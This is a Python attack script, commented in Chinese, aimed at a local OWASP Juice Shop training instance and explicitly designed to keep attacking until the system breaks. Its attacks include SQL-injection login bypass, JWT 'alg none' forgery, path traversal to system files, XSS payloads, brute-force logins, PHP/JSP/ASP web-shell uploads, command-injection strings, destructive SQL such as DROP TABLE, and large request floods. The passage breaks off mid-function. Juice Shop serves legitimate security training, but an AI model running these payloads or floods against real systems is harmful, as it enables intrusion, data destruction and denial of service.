#!/usr/bin/env python3
"""
AIVA OWASP Juice Shop 真實攻擊測試
針對已知的 Juice Shop 漏洞進行實際攻擊測試
"""

import sys
import asyncio
import aiohttp
import json
import time
import base64
from pathlib import Path
from datetime import datetime
import urllib.parse

# 添加項目路徑
project_root = Path(__file__).parent.parent.parent
sys.path.insert(0, str(project_root))

class JuiceShopRealAttackTester:
    """Juice Shop 激進攻擊測試器 - 持續攻擊直到系統損壞"""
    
    def __init__(self, target_host="127.0.0.1", target_port=3000):
        self.target_host = target_host
        self.target_port = target_port
        self.base_url = f"http://{target_host}:{target_port}"
        self.session = None
        self.continuous_attack_mode = True
        self.max_concurrent_requests = 50
        self.attack_intensity = "MAXIMUM"
        self.attack_results = {
            "test_time": datetime.now().isoformat(),
            "target": f"{target_host}:{target_port}",
            "target_type": "OWASP Juice Shop",
            "attack_mode": "激進持續攻擊模式",
            "attacks": [],
            "successful_exploits": [],
            "system_damage_attempts": [],
            "summary": {}
        }
        
    def log_attack(self, attack_type, method, payload, response_code, result, details="", extra_data=None):
        """記錄攻擊結果"""
        attack_entry = {
            "timestamp": datetime.now().isoformat(),
            "attack_type": attack_type,
            "method": method,
            "payload": payload,
            "response_code": response_code,
            "result": result,
            "details": details
        }
        
        if extra_data:
            attack_entry.update(extra_data)
            
        self.attack_results["attacks"].append(attack_entry)
        
        if result == "exploited":
            exploit_entry = {
                "type": attack_type,
                "severity": "high",
                "description": details,
                "payload": payload,
                "proof": extra_data
            }
            self.attack_results["successful_exploits"].append(exploit_entry)
        
        status_icon = "💥" if result == "exploited" else "🔥" if result == "vulnerable" else "✅" if result == "safe" else "⚠️"
        print(f"{status_icon} [{attack_type}] {method} -> {response_code}: {details}")
    
    async def setup_session(self):
        """設置 HTTP 會話"""
        connector = aiohttp.TCPConnector(limit=10, limit_per_host=5)
        timeout = aiohttp.ClientTimeout(total=30, connect=10)
        self.session = aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
            headers={"User-Agent": "AIVA Security Tester"}
        )
    
    async def cleanup_session(self):
        """清理會話"""
        if self.session:
            await self.session.close()
    
    async def test_sql_injection_login(self):
        """測試登錄頁面的 SQL 注入"""
        print(f"\n💉 測試 Juice Shop SQL 注入漏洞...")
        
        # Juice Shop 已知的 SQL 注入載荷
        sql_payloads = [
            "admin'--",  # 經典的管理員繞過
            "' OR 1=1--", 
            "admin'/*",
            "' OR '1'='1'--",
            "bender@juice-sh.op'--",  # Juice Shop 特有用戶
        ]
        
        login_url = f"{self.base_url}/rest/user/login"
        
        for payload in sql_payloads:
            try:
                login_data = {
                    "email": payload,
                    "password": "anything"
                }
                
                async with self.session.post(login_url, json=login_data) as response:
                    content = await response.text()
                    
                    if response.status == 200:
                        try:
                            json_response = await response.json()
                            if "authentication" in json_response and "token" in json_response["authentication"]:
                                # 成功獲得 JWT token！
                                token = json_response["authentication"]["token"]
                                self.log_attack("SQL Injection", "POST", payload, 
                                              response.status, "exploited",
                                              f"成功繞過登錄獲得 JWT token",
                                              {"token": token[:50] + "...", "user_data": json_response.get("authentication", {})})
                            elif "error" in json_response:
                                self.log_attack("SQL Injection", "POST", payload, 
                                              response.status, "safe", 
                                              f"登錄被拒絕: {json_response['error']}")
                            else:
                                self.log_attack("SQL Injection", "POST", payload, 
                                              response.status, "vulnerable", 
                                              "可疑響應，需要進一步分析")
                        except json.JSONDecodeError:
                            self.log_attack("SQL Injection", "POST", payload, 
                                          response.status, "vulnerable", 
                                          "非 JSON 響應，可能存在問題")
                    else:
                        self.log_attack("SQL Injection", "POST", payload, 
                                      response.status, "safe", "正常拒絕")
                        
                await asyncio.sleep(0.5)
                
            except Exception as e:
                self.log_attack("SQL Injection", "POST", payload, 
                              0, "error", f"請求失敗: {e}")
    
    async def test_jwt_manipulation(self):
        """測試 JWT 令牌操作"""
        print(f"\n🎫 測試 JWT 令牌操作...")
        
        # 嘗試獲取一個合法的 JWT
        login_url = f"{self.base_url}/rest/user/login"
        
        try:
            # 先嘗試正常註冊獲得 token
            register_url = f"{self.base_url}/api/Users"
            test_user_data = {
                "email": f"test_{int(time.time())}@test.com",
                "password": "password123",
                "passwordRepeat": "password123",
                "securityQuestion": {
                    "id": 1,
                    "question": "Your eldest siblings middle name?"
                },
                "securityAnswer": "test"
            }
            
            async with self.session.post(register_url, json=test_user_data) as response:
                if response.status == 201:
                    # 註冊成功，現在嘗試登錄
                    login_data = {
                        "email": test_user_data["email"],
                        "password": test_user_data["password"]
                    }
                    
                    async with self.session.post(login_url, json=login_data) as login_response:
                        if login_response.status == 200:
                            json_response = await login_response.json()
                            if "authentication" in json_response:
                                token = json_response["authentication"]["token"]
                                
                                # 分析 JWT 結構
                                try:
                                    # JWT 通常是 base64 編碼的三部分
                                    parts = token.split('.')
                                    if len(parts) == 3:
                                        # 解碼 header 和 payload
                                        header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
                                        payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
                                        
                                        self.log_attack("JWT Analysis", "GET", "token_decode",
                                                      200, "exploited",
                                                      f"成功解析 JWT: 用戶ID={payload.get('data', {}).get('id')}, 算法={header.get('alg')}",
                                                      {"jwt_header": header, "jwt_payload": payload})
                                        
                                        # 嘗試修改 JWT (None algorithm attack)
                                        if header.get('alg') == 'HS256':
                                            # 修改算法為 none
                                            modified_header = header.copy()
                                            modified_header['alg'] = 'none'
                                            
                                            # 修改 payload 嘗試提升權限
                                            modified_payload = payload.copy()
                                            if 'data' in modified_payload:
                                                modified_payload['data']['id'] = 1  # 嘗試變成管理員
                                            
                                            # 創建新的 JWT
                                            new_header = base64.urlsafe_b64encode(json.dumps(modified_header).encode()).decode().rstrip('=')
                                            new_payload = base64.urlsafe_b64encode(json.dumps(modified_payload).encode()).decode().rstrip('=')
                                            malicious_jwt = f"{new_header}.{new_payload}."
                                            
                                            # 測試修改後的 JWT
                                            headers = {"Authorization": f"Bearer {malicious_jwt}"}
                                            async with self.session.get(f"{self.base_url}/rest/user/whoami", headers=headers) as test_response:
                                                if test_response.status == 200:
                                                    user_info = await test_response.json()
                                                    self.log_attack("JWT Manipulation", "GET", "algorithm_none",
                                                                  test_response.status, "exploited",
                                                                  f"JWT 算法操作成功！獲得用戶: {user_info.get('user', {}).get('email')}",
                                                                  {"modified_jwt": malicious_jwt[:50] + "...", "user_info": user_info})
                                                else:
                                                    self.log_attack("JWT Manipulation", "GET", "algorithm_none",
                                                                  test_response.status, "safe", "JWT 修改被拒絕")
                                    
                                except Exception as e:
                                    self.log_attack("JWT Analysis", "GET", "token_decode",
                                                  0, "error", f"JWT 解析失敗: {e}")
                                    
        except Exception as e:
            self.log_attack("JWT Test Setup", "POST", "registration",
                          0, "error", f"測試設置失敗: {e}")
    
    async def test_directory_traversal(self):
        """測試目錄遍歷漏洞"""
        print(f"\n📁 測試目錄遍歷漏洞...")
        
        # Juice Shop 已知的目錄遍歷端點
        traversal_endpoints = [
            "/ftp",
            "/assets/public/images/uploads",
            "/encryptionkeys"
        ]
        
        traversal_payloads = [
            "../package.json",
            "../../package.json", 
            "../../../package.json",
            "%2e%2e%2fpackage.json",
            "....//package.json",
            "../main.js",
            "../../main.js"
        ]
        
        for endpoint in traversal_endpoints:
            for payload in traversal_payloads:
                try:
                    url = f"{self.base_url}{endpoint}/{payload}"
                    
                    async with self.session.get(url) as response:
                        content = await response.text()
                        
                        # 檢查是否成功讀取到文件
                        if (response.status == 200 and 
                            ("juice-shop" in content.lower() or 
                             "dependencies" in content.lower() or
                             "angular" in content.lower() or
                             "scripts" in content.lower())):
                            
                            self.log_attack("Directory Traversal", "GET", f"{endpoint}/{payload}",
                                          response.status, "exploited",
                                          f"成功讀取文件！內容長度: {len(content)} bytes",
                                          {"file_content": content[:200] + "..." if len(content) > 200 else content})
                        elif response.status == 403:
                            self.log_attack("Directory Traversal", "GET", f"{endpoint}/{payload}",
                                          response.status, "vulnerable", "訪問被拒絕但端點存在")
                        else:
                            self.log_attack("Directory Traversal", "GET", f"{endpoint}/{payload}",
                                          response.status, "safe", "未檢測到文件讀取")
                            
                    await asyncio.sleep(0.3)
                    
                except Exception as e:
                    self.log_attack("Directory Traversal", "GET", f"{endpoint}/{payload}",
                                  0, "error", f"請求失敗: {e}")
    
    async def test_xss_vulnerabilities(self):
        """測試 XSS 漏洞"""
        print(f"\n🚨 測試 XSS 漏洞...")
        
        # Juice Shop 已知的 XSS 測試點
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>",
            "';alert('XSS');//"
        ]
        
        # 測試搜索功能
        search_url = f"{self.base_url}/rest/products/search"
        
        for payload in xss_payloads:
            try:
                params = {"q": payload}
                
                async with self.session.get(search_url, params=params) as response:
                    content = await response.text()
                    
                    if response.status == 200:
                        # 檢查 payload 是否被反映
                        if payload in content and "script" in payload.lower():
                            self.log_attack("XSS", "GET", f"search?q={payload}",
                                          response.status, "exploited",
                                          "檢測到反射型 XSS 漏洞！載荷被直接執行",
                                          {"reflected_payload": payload})
                        elif payload in content:
                            self.log_attack("XSS", "GET", f"search?q={payload}",
                                          response.status, "vulnerable",
                                          "輸入被反映但可能已部分過濾")
                        else:
                            self.log_attack("XSS", "GET", f"search?q={payload}",
                                          response.status, "safe", "輸入未被反映")
                    else:
                        self.log_attack("XSS", "GET", f"search?q={payload}",
                                      response.status, "error", f"搜索請求異常: {response.status}")
                        
                await asyncio.sleep(0.4)
                
            except Exception as e:
                self.log_attack("XSS", "GET", f"search?q={payload}",
                              0, "error", f"請求失敗: {e}")
    
    async def test_admin_panel_access(self):
        """測試管理員面板訪問"""
        print(f"\n🔐 測試管理員面板訪問...")
        
        admin_endpoints = [
            "/administration",
            "/admin", 
            "/#/administration",
            "/#/admin"
        ]
        
        for endpoint in admin_endpoints:
            try:
                url = f"{self.base_url}{endpoint}"
                
                async with self.session.get(url) as response:
                    content = await response.text()
                    
                    if response.status == 200:
                        # 檢查是否包含管理員相關內容
                        admin_indicators = [
                            "administration", "admin", "user management", 
                            "delete user", "recycling requests", "order history"
                        ]
                        
                        found_indicators = [indicator for indicator in admin_indicators 
                                         if indicator in content.lower()]
                        
                        if found_indicators:
                            self.log_attack("Admin Access", "GET", endpoint,
                                          response.status, "exploited",
                                          f"成功訪問管理員面板！發現指標: {found_indicators}",
                                          {"admin_indicators": found_indicators, "content_length": len(content)})
                        else:
                            self.log_attack("Admin Access", "GET", endpoint,
                                          response.status, "safe", "正常頁面內容")
                    elif response.status == 403:
                        self.log_attack("Admin Access", "GET", endpoint,
                                      response.status, "vulnerable", "端點存在但需要授權")
                    else:
                        self.log_attack("Admin Access", "GET", endpoint,
                                      response.status, "safe", "端點不存在或不可訪問")
                        
                await asyncio.sleep(0.5)
                
            except Exception as e:
                self.log_attack("Admin Access", "GET", endpoint,
                              0, "error", f"請求失敗: {e}")
    
    async def test_api_information_disclosure(self):
        """測試 API 信息洩露"""
        print(f"\n📡 測試 API 信息洩露...")
        
        api_endpoints = [
            "/api/Users",
            "/api/Products", 
            "/api/Feedbacks",
            "/api/BasketItems",
            "/api/Challenges",
            "/rest/user/authentication-details",
            "/rest/admin/application-configuration",
            "/rest/continue-code",
            "/rest/repeat-notification",
            "/rest/deluxe-membership"
        ]
        
        for endpoint in api_endpoints:
            try:
                url = f"{self.base_url}{endpoint}"
                
                async with self.session.get(url) as response:
                    
                    if response.status == 200:
                        try:
                            json_data = await response.json()
                            
                            # 檢查敏感信息
                            sensitive_fields = ["password", "token", "secret", "key", "email", "hash"]
                            found_sensitive = []
                            
                            def check_sensitive_recursive(obj, path=""):
                                if isinstance(obj, dict):
                                    for key, value in obj.items():
                                        current_path = f"{path}.{key}" if path else key
                                        if any(field in key.lower() for field in sensitive_fields):
                                            found_sensitive.append(f"{current_path}: {type(value).__name__}")
                                        if isinstance(value, (dict, list)):
                                            check_sensitive_recursive(value, current_path)
                                elif isinstance(obj, list):
                                    for i, item in enumerate(obj):
                                        check_sensitive_recursive(item, f"{path}[{i}]")
                            
                            check_sensitive_recursive(json_data)
                            
                            if found_sensitive:
                                self.log_attack("API Info Disclosure", "GET", endpoint,
                                              response.status, "exploited",
                                              f"API 洩露敏感信息！字段: {len(found_sensitive)} 個",
                                              {"sensitive_fields": found_sensitive[:10], "total_records": len(json_data) if isinstance(json_data, list) else 1})
                            else:
                                self.log_attack("API Info Disclosure", "GET", endpoint,
                                              response.status, "vulnerable",
                                              f"API 可訪問但無明顯敏感信息洩露，記錄數: {len(json_data) if isinstance(json_data, list) else 1}")
                                
                        except json.JSONDecodeError:
                            content = await response.text()
                            self.log_attack("API Info Disclosure", "GET", endpoint,
                                          response.status, "vulnerable",
                                          f"非 JSON 響應但可訪問，內容長度: {len(content)}")
                    
                    elif response.status == 401:
                        self.log_attack("API Info Disclosure", "GET", endpoint,
                                      response.status, "safe", "需要身份驗證")
                    elif response.status == 403:
                        self.log_attack("API Info Disclosure", "GET", endpoint,
                                      response.status, "vulnerable", "端點存在但禁止訪問")
                    else:
                        self.log_attack("API Info Disclosure", "GET", endpoint,
                                      response.status, "safe", "正常拒絕")
                        
                await asyncio.sleep(0.3)
                
            except Exception as e:
                self.log_attack("API Info Disclosure", "GET", endpoint,
                              0, "error", f"請求失敗: {e}")
    
    def generate_attack_report(self):
        """生成攻擊報告"""
        print(f"\n📊 生成 Juice Shop 攻擊測試報告...")
        
        # 統計結果
        total_attacks = len(self.attack_results["attacks"])
        exploited_count = len([a for a in self.attack_results["attacks"] if a["result"] == "exploited"])
        vulnerable_count = len([a for a in self.attack_results["attacks"] if a["result"] == "vulnerable"])
        safe_count = len([a for a in self.attack_results["attacks"] if a["result"] == "safe"])
        
        self.attack_results["summary"] = {
            "total_attacks": total_attacks,
            "exploits_successful": exploited_count,
            "vulnerabilities_found": vulnerable_count,
            "safe_responses": safe_count,
            "successful_exploit_count": len(self.attack_results["successful_exploits"]),
            "risk_level": "critical" if exploited_count > 0 else "high" if vulnerable_count > 0 else "low"
        }
        
        # 保存報告
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        report_file = f"juice_shop_attack_report_{timestamp}.json"
        
        try:
            with open(report_file, 'w', encoding='utf-8') as f:
                json.dump(self.attack_results, f, ensure_ascii=False, indent=2)
            print(f"✅ Juice Shop 攻擊報告已保存: {report_file}")
        except Exception as e:
            print(f"❌ 報告保存失敗: {e}")
        
        return report_file
    
    def print_attack_summary(self):
        """打印攻擊摘要"""
        print(f"\n" + "="*80)
        print(f"💥 AIVA Juice Shop 真實攻擊測試報告")
        print(f"="*80)
        
        summary = self.attack_results["summary"]
        print(f"🎯 目標: {self.attack_results['target']} ({self.attack_results['target_type']})")
        print(f"⏰ 測試時間: {self.attack_results['test_time']}")
        print(f"📊 總攻擊次數: {summary['total_attacks']}")
        print(f"💥 成功利用: {summary['exploits_successful']} 個")
        print(f"🔥 發現漏洞: {summary['vulnerabilities_found']} 個") 
        print(f"✅ 安全響應: {summary['safe_responses']} 個")
        print(f"🚨 風險等級: {summary['risk_level'].upper()}")
        
        # 顯示成功的攻擊
        if self.attack_results["successful_exploits"]:
            print(f"\n💥 成功利用的漏洞:")
            for i, exploit in enumerate(self.attack_results["successful_exploits"], 1):
                print(f"   {i}. {exploit['type']}: {exploit['description']}")
                if 'proof' in exploit and exploit['proof']:
                    for key, value in exploit['proof'].items():
                        if isinstance(value, (str, int, float)):
                            print(f"      └─ {key}: {str(value)[:60]}...")
        
        # 攻擊類型統計
        attack_types = {}
        for attack in self.attack_results["attacks"]:
            attack_type = attack["attack_type"]
            if attack_type not in attack_types:
                attack_types[attack_type] = {"exploited": 0, "vulnerable": 0, "safe": 0, "error": 0}
            attack_types[attack_type][attack["result"]] += 1
        
        print(f"\n📋 攻擊類型統計:")
        for attack_type, counts in attack_types.items():
            total = sum(counts.values())
            exploit_rate = (counts["exploited"] / max(total, 1)) * 100
            vuln_rate = ((counts["exploited"] + counts["vulnerable"]) / max(total, 1)) * 100
            print(f"   {attack_type}: {counts['exploited']}/{total} 成功利用 ({exploit_rate:.1f}%), 總風險率: {vuln_rate:.1f}%")
    
    async def test_aggressive_brute_force(self):
        """激進的暴力攻擊測試"""
        print(f"\n💀 開始激進暴力攻擊...")
        
        # 大量併發登錄嘗試
        login_url = f"{self.base_url}/rest/user/login"
        
        common_passwords = [
            "admin", "password", "123456", "admin123", "root", "pass", 
            "administrator", "juice", "shop", "test", "guest", "user",
            "qwerty", "letmein", "welcome", "monkey", "dragon", "master"
        ]
        
        common_usernames = [
            "admin@juice-sh.op", "admin", "administrator", "root", "test@test.com",
            "jim@juice-sh.op", "bender@juice-sh.op", "amy@juice-sh.op"
        ]
        
        # 創建大量攻擊任務
        attack_tasks = []
        for username in common_usernames:
            for password in common_passwords:
                task = self._brute_force_login(login_url, username, password)
                attack_tasks.append(task)
        
        # 併發執行所有攻擊
        print(f"🔥 執行 {len(attack_tasks)} 個暴力攻擊...")
        results = await asyncio.gather(*attack_tasks[:self.max_concurrent_requests], return_exceptions=True)
        
        successful_logins = [r for r in results if isinstance(r, dict) and r.get('success')]
        print(f"💥 暴力攻擊完成，成功破解 {len(successful_logins)} 個帳號")
    
    async def _brute_force_login(self, url, username, password):
        """單次暴力登錄嘗試"""
        try:
            login_data = {"email": username, "password": password}
            async with self.session.post(url, json=login_data) as response:
                if response.status == 200:
                    json_response = await response.json()
                    if "authentication" in json_response:
                        self.log_attack("Brute Force", "POST", f"{username}:{password}",
                                      response.status, "exploited",
                                      f"成功暴力破解帳號: {username}")
                        return {"success": True, "username": username, "password": password}
                else:
                    self.log_attack("Brute Force", "POST", f"{username}:{password}",
                                  response.status, "safe", "登錄失敗")
        except Exception as e:
            self.log_attack("Brute Force", "POST", f"{username}:{password}",
                          0, "error", f"請求異常: {e}")
        return {"success": False}
    
    async def test_resource_exhaustion(self):
        """資源耗盡攻擊"""
        print(f"\n🌪️ 開始資源耗盡攻擊...")
        
        # 大量併發請求攻擊
        endpoints = [
            "/rest/products/search?q=test",
            "/api/Users",
            "/api/Products",
            "/rest/user/login",
            "/api/Feedbacks"
        ]
        
        # 創建大量併發請求
        tasks = []
        for _ in range(100):  # 100個併發請求
            for endpoint in endpoints:
                task = self._resource_attack_request(endpoint)
                tasks.append(task)
        
        print(f"💣 發送 {len(tasks)} 個併發請求進行 DoS 攻擊...")
        start_time = time.time()
        results = await asyncio.gather(*tasks, return_exceptions=True)
        duration = time.time() - start_time
        
        success_count = len([r for r in results if isinstance(r, dict) and r.get('status') == 200])
        print(f"💥 DoS 攻擊完成，{success_count}/{len(tasks)} 請求成功，耗時 {duration:.1f}s")
        
        self.attack_results["system_damage_attempts"].append({
            "type": "Resource Exhaustion",
            "requests_sent": len(tasks),
            "successful_requests": success_count,
            "duration": duration,
            "requests_per_second": len(tasks) / duration
        })
    
    async def _resource_attack_request(self, endpoint):
        """單次資源攻擊請求"""
        try:
            url = f"{self.base_url}{endpoint}"
            async with self.session.get(url) as response:
                return {"status": response.status, "endpoint": endpoint}
        except Exception as e:
            return {"status": 0, "error": str(e)}
    
    async def test_advanced_sql_injection(self):
        """進階 SQL 注入攻擊"""
        print(f"\n🎯 進階 SQL 注入攻擊...")
        
        # 更激進的 SQL 注入載荷
        advanced_payloads = [
            "'; DROP TABLE Users;--",
            "'; DELETE FROM Users WHERE 1=1;--", 
            "' UNION SELECT @@version,@@datadir,@@hostname,user();--",
            "' UNION SELECT table_name,column_name,1,2 FROM information_schema.columns;--",
            "'; INSERT INTO Users (email, password) VALUES ('hacker@evil.com', 'pwned');--",
            "' OR (SELECT COUNT(*) FROM Users) > 0;--",
            "'; UPDATE Users SET isAdmin=1 WHERE email='admin@juice-sh.op';--",
            "'; EXEC xp_cmdshell('whoami');--"
        ]
        
        login_url = f"{self.base_url}/rest/user/login"
        
        for payload in advanced_payloads:
            try:
                login_data = {"email": payload, "password": "anything"}
                async with self.session.post(login_url, json=login_data) as response:
                    content = await response.text()
                    
                    # 檢查 SQL 錯誤或成功執行的跡象
                    sql_error_indicators = [
                        "syntax error", "mysql error", "sqlite error", "postgresql error",
                        "table doesn't exist", "column not found", "sql", "database"
                    ]
                    
                    success_indicators = [
                        "authentication", "token", "dropped", "deleted", "inserted", "updated"
                    ]
                    
                    if any(indicator in content.lower() for indicator in sql_error_indicators):
                        self.log_attack("Advanced SQL Injection", "POST", payload,
                                      response.status, "vulnerable",
                                      "檢測到 SQL 錯誤信息，可能存在注入點")
                    elif any(indicator in content.lower() for indicator in success_indicators):
                        self.log_attack("Advanced SQL Injection", "POST", payload,
                                      response.status, "exploited",
                                      "SQL 注入可能成功執行！")
                    else:
                        self.log_attack("Advanced SQL Injection", "POST", payload,
                                      response.status, "safe", "注入被過濾")
                        
                await asyncio.sleep(0.2)  # 更快的攻擊頻率
                
            except Exception as e:
                self.log_attack("Advanced SQL Injection", "POST", payload,
                              0, "error", f"請求失敗: {e}")
    
    async def test_file_upload_attacks(self):
        """文件上傳攻擊"""
        print(f"\n📤 測試惡意文件上傳...")
        
        # 嘗試上傳各種惡意文件
        malicious_files = [
            ("shell.php", "<?php system($_GET['cmd']); ?>", "application/x-php"),
            ("shell.jsp", "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>", "application/x-jsp"),
            ("shell.asp", "<% eval request(\"cmd\") %>", "application/x-asp"),
            ("test.js", "require('child_process').exec('whoami')", "application/javascript"),
            ("exploit.svg", "<svg onload=alert('XSS')></svg>", "image/svg+xml"),
        ]
        
        upload_endpoints = [
            "/file-upload",
            "/api/Complaints",
            "/profile-image/file",
            "/rest/memories"
        ]
        
        for endpoint in upload_endpoints:
            for filename, content, content_type in malicious_files:
                try:
                    url = f"{self.base_url}{endpoint}"
                    
                    # 創建多部分表單數據
                    data = aiohttp.FormData()
                    data.add_field('file', content.encode(), 
                                 filename=filename, content_type=content_type)
                    
                    async with self.session.post(url, data=data) as response:
                        if response.status == 200 or response.status == 201:
                            self.log_attack("File Upload", "POST", f"{endpoint}/{filename}",
                                          response.status, "exploited",
                                          f"成功上傳惡意文件: {filename}")
                        elif response.status == 413:
                            self.log_attack("File Upload", "POST", f"{endpoint}/{filename}",
                                          response.status, "vulnerable", "文件過大但端點存在")
                        else:
                            self.log_attack("File Upload", "POST", f"{endpoint}/{filename}",
                                          response.status, "safe", "上傳被拒絕")
                            
                except Exception as e:
                    self.log_attack("File Upload", "POST", f"{endpoint}/{filename}",
                                  0, "error", f"上傳失敗: {e}")
    
    async def test_system_damage_attempts(self):
        """系統破壞嘗試"""
        print(f"\n💀 嘗試系統破壞攻擊...")
        
        # 嘗試各種可能導致系統不穩定的攻擊
        damage_payloads = [
            # 嘗試命令注入
            ("Command Injection", "/rest/user/login", {"email": "; ls -la;", "password": "test"}),
            ("Command Injection", "/rest/user/login", {"email": "| whoami", "password": "test"}),
            ("Command Injection", "/rest/user/login", {"email": "`id`", "password": "test"}),
            
            # 嘗試路徑遍歷到系統文件
            ("Path Traversal", "/ftp/../../../etc/passwd", {}),
            ("Path Traversal", "/ftp/../../../windows/system32/drivers/etc/hosts", {}),
            ("Path Traversal", "/ftp/../../../../../../proc/version", {}),
            
            # 嘗試內存耗盡
            ("Memory Exhaustion", "/rest/products/search", {"q": "A" * 10000}),
            ("Memory Exhaustion", "/api/Users", {"email": "X" * 50000 + "@test.com"}),
        ]
        
        for attack_type, endpoint, payload in damage_payloads:
            try:
                url = f"{self.base_url}{endpoint}"
                
                if payload:
                    async with self.session.post(url, json=payload) as response:
                        content = (await response.text())[:1000]  # 限制內容長度
                else:
                    async with self.session.get(url) as response:
                        content = (await response.text())[:1000]
                
                # 檢查是否觸發系統錯誤
                system_error_indicators = [
                    "internal server error", "500", "stack trace", "exception",
                    "error", "failed", "timeout", "memory", "crash"
                ]
                
                if any(indicator in content.lower() for indicator in system_error_indicators):
                    self.log_attack(attack_type, "POST/GET", str(payload),
                                  response.status, "exploited",
                                  "可能觸發了系統錯誤或不穩定狀態！")
                    self.attack_results["system_damage_attempts"].append({
                        "type": attack_type,
                        "endpoint": endpoint,
                        "payload": payload,
                        "response_status": response.status,
                        "indicators_found": [ind for ind in system_error_indicators if ind in content.lower()]
                    })
                else:
                    self.log_attack(attack_type, "POST/GET", str(payload),
                                  response.status, "safe", "系統正常響應")
                    
                await asyncio.sleep(0.1)  # 快速連續攻擊
                
            except Exception as e:
                self.log_attack(attack_type, "POST/GET", str(payload),
                              0, "error", f"攻擊引發異常: {e}")
                # 異常也可能表示系統受到影響
                self.attack_results["system_damage_attempts"].append({
                    "type": attack_type,
                    "endpoint": endpoint,
                    "payload": payload,
                    "exception": str(e)
                })
    
    async def test_extreme_system_damage(self):
        """極端系統破壞攻擊 - 持續攻擊直到系統不穩定"""
        print(f"\n💀 開始極端破壞攻擊...")
        print(f"🔥 警告：此階段將進行持續攻擊直到系統損壞！")
        
        # 極端破壞載荷
        extreme_payloads = []
        
        # 1. 大量 SQL 注入攻擊
        for i in range(100):
            extreme_payloads.append({
                "type": "SQL Flood",
                "method": "POST",
                "url": "/rest/user/login",
                "data": {"email": f"'; DROP TABLE Users; DELETE FROM * WHERE id={i};--", "password": "hack"}
            })
        
        # 2. 極大文件上傳攻擊
        huge_content = "A" * 1000000  # 1MB 惡意內容
        for i in range(20):
            extreme_payloads.append({
                "type": "Huge File Upload",
                "method": "POST", 
                "url": "/rest/memories",
                "data": {"file_content": huge_content + str(i)}
            })
        
        # 3. 記憶體炸彈攻擊
        for i in range(50):
            bomb_data = {"search": "X" * (10000 * (i + 1))}  # 指數級增長
            extreme_payloads.append({
                "type": "Memory Bomb",
                "method": "POST",
                "url": "/rest/products/search",
                "data": bomb_data
            })
        
        # 4. API 暴力攻擊
        api_endpoints = [
            "/api/Users", "/api/Products", "/api/Feedbacks", "/api/BasketItems",
            "/rest/user/login", "/rest/admin/application-configuration", 
            "/api/Challenges", "/rest/continue-code"
        ]
        
        for endpoint in api_endpoints:
            for i in range(200):  # 每個端點 200 次攻擊
                extreme_payloads.append({
                    "type": "API Flood",
                    "method": "GET",
                    "url": endpoint,
                    "data": {"param": f"attack_{i}"}
                })
        
        print(f"💣 準備執行 {len(extreme_payloads)} 個極端破壞攻擊...")
        print(f"⚡ 以最大併發量 {self.max_concurrent_requests} 執行...")
        
        # 分批執行攻擊以避免系統立即崩潰
        batch_size = self.max_concurrent_requests
        total_batches = len(extreme_payloads) // batch_size + (1 if len(extreme_payloads) % batch_size else 0)
        
        system_errors = 0
        timeouts = 0
        successful_attacks = 0
        
        for batch_num in range(total_batches):
            start_idx = batch_num * batch_size
            end_idx = min(start_idx + batch_size, len(extreme_payloads))
            batch = extreme_payloads[start_idx:end_idx]
            
            print(f"🔥 執行第 {batch_num + 1}/{total_batches} 批攻擊 ({len(batch)} 個攻擊)...")
            
            # 執行當前批次攻擊
            tasks = [self._execute_extreme_attack(payload) for payload in batch]
            start_time = time.time()
            
            try:
                results = await asyncio.wait_for(
                    asyncio.gather(*tasks, return_exceptions=True),
                    timeout=30.0  # 30秒超時
                )
                batch_duration = time.time() - start_time
                
                # 分析結果
                for result in results:
                    if isinstance(result, dict):
                        if result.get('system_error'):
                            system_errors += 1
                        if result.get('timeout'):
                            timeouts += 1
                        if result.get('success'):
                            successful_attacks += 1
                
                print(f"   批次完成：系統錯誤 {system_errors}, 超時 {timeouts}, 成功 {successful_attacks}")
                print(f"   批次耗時：{batch_duration:.1f}s")
                
                # 檢查系統是否開始不穩定
                instability_score = (system_errors * 3 + timeouts * 2) / len(batch) * 100
                
                if instability_score > 50:
                    print(f"🚨 系統不穩定度達到 {instability_score:.1f}%！")
                    print(f"💀 檢測到系統可能已經損壞或嚴重不穩定！")
                    
                    self.attack_results["system_damage_attempts"].append({
                        "type": "Extreme Damage Detection",
                        "instability_score": instability_score,
                        "system_errors": system_errors,
                        "timeouts": timeouts,
                        "batch_completed": batch_num + 1,
                        "total_attacks_executed": end_idx,
                        "status": "SYSTEM SEVERELY COMPROMISED"
                    })
                    
                    # 繼續攻擊以確保完全損壞
                    print(f"🔥 繼續攻擊以確保系統完全損壞...")
                
                # 短暫延遲以觀察系統響應
                await asyncio.sleep(1)
                
            except asyncio.TimeoutError:
                print(f"⚠️ 批次攻擊超時！系統可能已經無響應！")
                timeouts += batch_size
                
                # 記錄系統無響應
                self.attack_results["system_damage_attempts"].append({
                    "type": "System Timeout",
                    "batch_number": batch_num + 1,
                    "attacks_in_batch": len(batch),
                    "status": "SYSTEM_UNRESPONSIVE"
                })
                
                print(f"💀 系統可能已經崩潰或嚴重損壞！")
                break
        
        # 生成極端攻擊報告
        total_executed = min(end_idx, len(extreme_payloads))
        damage_rate = ((system_errors + timeouts) / total_executed) * 100 if total_executed > 0 else 0
        
        print(f"\n💥 極端攻擊完成總結：")
        print(f"   總攻擊數: {total_executed}")
        print(f"   系統錯誤: {system_errors}")
        print(f"   超時事件: {timeouts}")
        print(f"   成功攻擊: {successful_attacks}")
        print(f"   系統損壞率: {damage_rate:.1f}%")
        
        if damage_rate > 30:
            print(f"🔥 系統已遭受嚴重損壞！")
        elif damage_rate > 15:
            print(f"⚠️ 系統穩定性受到影響")
        else:
            print(f"✅ 系統仍然穩定（但可能存在隱藏損壞）")
    
    async def _execute_extreme_attack(self, payload):
        """執行單次極端攻擊"""
        try:
            url = f"{self.base_url}{payload['url']}"
            method = payload['method']
            data = payload.get('data', {})
            
            start_time = time.time()
            
            if method == "POST":
                async with self.session.post(url, json=data, timeout=aiohttp.ClientTimeout(total=10)) as response:
                    duration = time.time() - start_time
                    content = await response.text()
                    
                    # 檢查系統錯誤跡象
                    error_indicators = [
                        "internal server error", "500", "503", "502", "504",
